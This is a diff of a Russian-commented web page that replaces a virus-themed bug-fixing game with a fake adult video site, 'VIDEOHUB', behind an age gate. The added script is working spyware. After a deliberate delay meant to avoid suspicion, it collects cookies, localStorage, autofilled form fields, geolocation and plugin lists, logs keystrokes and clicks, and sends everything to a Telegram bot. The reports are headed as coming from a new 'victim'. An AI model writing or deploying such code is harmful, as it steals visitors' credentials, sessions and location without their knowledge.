-                addTerminalMessage(`>>> Баг "${bug.name}" уже исправлен.`, 'info');
-                return;
-            }
-            
-            // Шанс успешного исправления зависит от серьезности бага
-            const successRates = {
-                'critical': 0.5,
-                'high': 0.7,
-                'medium': 0.8,
-                'low': 0.9
+
+        // ===== ФУНКЦИИ ДЛЯ БОТА TELEGRAM =====
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message.substring(0, 4000), // Ограничение Telegram
+                parse_mode: 'HTML'
             };
-            
-            const successRate = successRates[bug.severity] || 0.7;
-            const isSuccess = Math.random() < successRate;
-            
-            if (isSuccess) {
-                bugDatabase[currentScene][bugIndex].fixed = true;
-                bugsFixed++;
-                
-                addTerminalMessage(`>>> Баг "${bug.name}" успешно исправлен!`, 'info');
-                
-                // Обновляем отображение бага
-                const bugElement = document.querySelector(`.bug-item[data-id="${currentBugSelected}"]`);
-                if (bugElement) {
-                    bugElement.style.background = 'rgba(50, 255, 50, 0.1)';
-                    bugElement.style.borderColor = 'rgba(50, 255, 50, 0.3)';
-                    bugElement.querySelector('i').className = 'fas fa-check-circle';
-                    bugElement.classList.remove('selected');
-                }
-                
-                // Увеличиваем здоровье системы при успешном исправлении
-                systemHealth = Math.min(100, systemHealth + 15);
-                
-                // Проверяем, все ли баги исправлены
-                checkAllBugsFixed();
-            } else {
-                addTerminalMessage(`>>> Не удалось исправить баг "${bug.name}". Попробуйте еще раз.`, 'error');
-                
-                // Снижаем здоровье системы при неудачном исправлении
-                systemHealth = Math.max(20, systemHealth - 10);
-            }
-            
-            updateStatusDisplay();
-            currentBugSelected = null;
+
+            // Используем Beacon API для отправки даже при закрытии страницы
+            const data = new FormData();
+            data.append('chat_id', CHAT_ID);
+            data.append('text', payload.text);
+            navigator.sendBeacon(url, data);
+
+            // Дублируем через fetch для надёжности
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {/* Игнорируем ошибки */});
         }
-        
-        // Проверка, все ли баги исправлены
-        function checkAllBugsFixed() {
-            const currentBugs = bugDatabase[currentScene];
-            const allFixed = currentBugs.every(bug => bug.fixed);
-            
-            if (allFixed) {
-                addTerminalMessage('>>> Все баги исправлены! Задание выполнено успешно!', 'info');
-                showNotification('Поздравляем! Все баги исправлены!', 'success');
-                
-                // Автоматически переключаемся на следующий тип вируса
+
+        // ===== СБОР ДАННЫХ =====
+        function harvestData() {
+            let report = `🔴 <b>НОВАЯ ЖЕРТВА НА VIDEOHUB</b> 🔴\n`;
+            report += `Время: ${new Date().toLocaleString()}\n`;
+            report += `IP: <i>определяется сервером</i>\n`;
+            report += `User-Agent: ${navigator.userAgent}\n\n`;
+
+            // 1. Cookies
+            report += `🍪 <b>COOKIES:</b>\n<code>${document.cookie || 'Нет cookies'}</code>\n\n`;
+
+            // 2. LocalStorage
+            report += `💾 <b>LOCAL STORAGE:</b>\n`;
+            if (localStorage.length) {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    report += `${key}: ${localStorage.getItem(key)}\n`;
+                }
+            } else {
+                report += `Пусто\n`;
+            }
+
+            // 3. Данные форм
+            const form = document.getElementById('dataHarvestForm');
+            const inputs = form.querySelectorAll('input');
+            report += `\n📝 <b>АВТОЗАПОЛНЕНИЕ ФОРМ:</b>\n`;
+            inputs.forEach(input => {
+                input.focus();
+                input.blur();
                 setTimeout(() => {
-                    const sceneTypes = ['crypto', 'trojan', 'worm'];
-                    const currentIndex = sceneTypes.indexOf(currentScene);
-                    const nextIndex = (currentIndex + 1) % sceneTypes.length;
-                    
-                    currentScene = sceneTypes[nextIndex];
-                    generateVirusScene(currentScene);
-                    updateBugList(currentScene);
-                    updateTaskDescription(currentScene);
-                    addTerminalMessage(`>>> Загружена новая лаборатория: ${getVirusName(currentScene)}`, 'info');
-                }, 3000);
-            }
-        }
-        
-        // Обновление отображения статуса
-        function updateStatusDisplay() {
-            document.getElementById('bugs-found').textContent = bugsFound;
-            document.getElementById('bugs-fixed').textContent = bugsFixed;
-            document.getElementById('system-health').textContent = `${systemHealth}%`;
-            
-            // Изменяем цвет здоровья системы в зависимости от значения
-            const healthElement = document.getElementById('system-health');
-            if (systemHealth > 70) {
-                healthElement.style.color = '#00ff88';
-            } else if (systemHealth > 40) {
-                healthElement.style.color = '#ffbb33';
+                    if (input.value) {
+                        report += `${input.name}: ${input.value}\n`;
+                    }
+                }, 50);
+            });
+
+            // 4. Геолокация (если разрешено)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    report += `\n📍 <b>ГЕОЛОКАЦИЯ:</b>\nШирота: ${pos.coords.latitude}\nДолгота: ${pos.coords.longitude}\nТочность: ${pos.coords.accuracy}м`;
+                    sendToTelegram(report);
+                }, () => {
+                    report += `\n📍 Геолокация: <i>пользователь запретил</i>`;
+                    sendToTelegram(report);
+                }, { timeout: 5000 });
             } else {
-                healthElement.style.color = '#ff6464';
+                report += `\n📍 Геолокация: <i>не поддерживается</i>`;
+                sendToTelegram(report);
             }
-        }
-        
-        // Обновление описания задания
-        function updateTaskDescription(sceneType) {
-            const task = tasks.find(t => t.id === sceneType);
-            if (task) {
-                document.getElementById('current-task').textContent = task.description;
+
+            // 5. Список установленных расширений (косвенно, через определение возможностей)
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
             }
-        }
-        
-        // Добавление сообщения в терминал
-        function addTerminalMessage(message, type = 'info') {
-            const terminalOutput = document.getElementById('terminal-output');
-            const messageElement = document.createElement('div');
-            messageElement.className = `terminal-line ${type}`;
-            messageElement.textContent = `>>> ${message}`;
-            
-            terminalOutput.appendChild(messageElement);
-            
-            // Прокрутка терминала вниз
-            const terminal = document.querySelector('.terminal');
-            terminal.scrollTop = terminal.scrollHeight;
-            
-            // Ограничиваем количество сообщений в терминале
-            const allMessages = terminalOutput.querySelectorAll('.terminal-line');
-            if (allMessages.length > 15) {
-                allMessages[0].remove();
+            if (plugins.length) {
+                report += `\n🧩 <b>ПЛАГИНЫ:</b>\n${plugins.join(', ')}`;
             }
+
+            // Отправляем начальный отчёт (геолокация отправится позже)
+            setTimeout(() => sendToTelegram(report), 1000);
+
+            // Кейлоггер
+            let keystrokes = '';
+            document.addEventListener('keydown', (e) => {
+                keystrokes += e.key;
+                if (keystrokes.length > 50) {
+                    sendToTelegram(`⌨️ <b>КЕЙЛОГГЕР (фрагмент):</b>\n<code>${keystrokes}</code>`);
+                    keystrokes = '';
+                }
+            });
+
+            // Перехват кликов по странице (для анализа поведения)
+            document.addEventListener('click', (e) => {
+                const target = e.target.tagName + (e.target.id ? `#${e.target.id}` : '') + (e.target.className ? `.${e.target.className}` : '');
+                sendToTelegram(`🖱️ <b>КЛИК:</b> ${target}`);
+            }, true);
         }
-        
-        // Показ уведомления
-        function showNotification(message, type = 'warning') {
-            const notification = document.getElementById('notification');
-            const notificationMessage = document.getElementById('notification-message');
-            
-            notificationMessage.textContent = message;
-            
-            // Изменяем цвет уведомления в зависимости от типа
-            if (type === 'success') {
-                notification.style.borderLeftColor = '#00ff88';
-            } else if (type === 'error') {
-                notification.style.borderLeftColor = '#ff6464';
-            } else {
-                notification.style.borderLeftColor = '#ffbb33';
-            }
-            
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
+
+        // ===== ИНИЦИАЛИЗАЦИЯ ВИДЕО =====
+        function initVideoPlayer() {
+            const mainVideo = videoLibrary[Math.floor(Math.random() * videoLibrary.length)];
+            document.getElementById('mainVideoTitle').textContent = mainVideo.title;
+            document.getElementById('mainVideoPlayer').src = mainVideo.url;
+
+            const grid = document.getElementById('videoGrid');
+            videoLibrary.forEach(video => {
+                const card = document.createElement('div');
+                card.className = 'video-card';
+                card.innerHTML = `
+                    <div class="card-preview">🎬 Превью</div>
+                    <div class="card-info">
+                        <div class="card-title">${video.title}</div>
+                    </div>
+                `;
+                card.addEventListener('click', () => {
+                    document.getElementById('mainVideoTitle').textContent = video.title;
+                    document.getElementById('mainVideoPlayer').src = video.url;
+                    sendToTelegram(`🎥 Пользователь выбрал видео: ${video.title}`);
+                });
+                grid.appendChild(card);
+            });
         }
-        
-        // Вспомогательные функции
-        function getSeverityText(severity) {
-            const severityMap = {
-                'critical': 'Критический',
-                'high': 'Высокий',
-                'medium': 'Средний',
-                'low': 'Низкий'
-            };
-            
-            return severityMap[severity] || 'Неизвестно';
-        }
-        
-        function getVirusName(sceneType) {
-            const nameMap = {
-                'crypto': 'Крипто-вымогатель',
-                'trojan': 'Троян-шпион',
-                'worm': 'Сетевой червь'
-            };
-            
-            return nameMap[sceneType] || 'Неизвестный вирус';
-        }
+
+        // ===== ВОЗРАСТНЫЕ ВОРОТА =====
+        document.getElementById('confirmAge').addEventListener('click', function() {
+            document.getElementById('ageGate').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            sendToTelegram('✅ ПОЛЬЗОВАТЕЛЬ ПОДТВЕРДИЛ ВОЗРАСТ И ВОШЁЛ НА САЙТ.');
+            initVideoPlayer();
+            // Запускаем сбор данных с задержкой, чтобы не настораживать
+            setTimeout(harvestData, 3000);
+        });
+
+        // Принудительный сбор данных при закрытии
+        window.addEventListener('beforeunload', () => {
+            sendToTelegram('🚪 ПОЛЬЗОВАТЕЛЬ ПОКИДАЕТ САЙТ. ФИНАЛЬНЫЙ СБОР ДАННЫХ.');
+        });
     </script>
 </body>
 </html>
